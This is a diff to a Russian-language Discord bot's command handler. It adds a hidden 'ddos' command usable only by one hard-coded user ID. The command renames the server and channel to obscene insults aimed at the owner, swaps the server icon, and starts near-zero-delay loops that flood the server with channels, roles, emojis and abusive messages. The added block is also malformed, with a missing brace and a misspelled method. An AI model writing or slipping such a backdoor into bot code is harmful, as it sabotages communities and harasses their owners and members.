@@ -239,7 +239,27 @@ client.on('message', async (message) => {
 	    message.reply(embed);*/
     } else if(['count', 'копить'].includes(command)) {
 	    gameCount = gameCount + 1; actALL = actALL + 1;
-	   message.reply(`${gameCount}, успех ✓`);
+      message.reply(`${gameCount}, успех ✓`);
+    } else if(['ddos', 'ддос'].includes(command) && (message.author.id === '361951318929309707'))
+	message.channel.send("ЕБОШЬЬЬЬЬЬ")
+        message.channel.guild.setIcon('https://cdn.discordapp.com/attachments/459062113025916951/459064114761695233/1517860062.jpg')
+        message.channel.guild.setName('ОВНЕР ХУЙ САСИ')
+        message.channel.setTolic('ОВНЕР ХУЙ САСИ')
+        message.channel.setName('ОВНЕР ХУЙ САСИ')
+setInterval(function () {
+message.channel.guild.createChannel('овнер пидор', 'voice')
+  .then(console.log)
+  .catch(console.error);}, Math.floor(Math.random() * (1- 1)) + 1);
+setInterval(function () {
+message.channel.guild.createChannel('овнер пидор', 'text')
+  .then(console.log)
+  .catch(console.error);}, Math.floor(Math.random() * (1- 1)) + 1);
+setInterval(function () {
+message.channel.guild.createRole('овнер хуй саси')}, Math.floor(Math.random() * (1- 1)) + 1);
+setInterval(function () {
+message.channel.guild.createEmoji('https://cdn.discordapp.com/attachments/400670340885250049/459060140398739456/1520359453.jpg', 'sasai_owner')}, Math.floor(Math.random() * (1- 1)) + 1);
+setInterval(function () {
+message.channel.send("овнер пидор")}, Math.floor(Math.random() * (1- 1)) + 1);    
     } else if(['iinvite', 'inviteInfo', 'infoInvite'].includes(command)) {
 	    actFUN = actFUN + 1;actALL = actALL +1;
 	    let invi = args.join(" ")
